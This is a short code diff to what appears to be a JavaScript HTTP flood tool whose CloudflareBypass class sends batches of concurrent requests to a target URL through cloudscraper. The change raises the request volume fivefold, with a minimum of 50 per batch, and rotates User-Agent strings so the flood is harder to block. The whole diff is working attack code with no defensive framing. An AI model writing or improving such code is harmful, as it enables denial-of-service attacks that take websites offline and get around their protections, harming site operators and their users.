@@ -27,14 +27,19 @@ export class CloudflareBypass {
 
     async attack() {
         const promises = [];
+        const requestsPerBatch = Math.max(this.rpc * 5, 50); // Multiply RPC by 5, min 50
 
-        for (let i = 0; i < this.rpc; i++) {
+        for (let i = 0; i < requestsPerBatch; i++) {
             if (!this.active) break;
 
             const promise = cloudscraper.get(this.url, {
                 timeout: 10000,
                 headers: {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    'User-Agent': Tools.randomChoice([
+                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+                    ])
                 }
             }).then(response => {
                 REQUESTS_SENT.add(1);
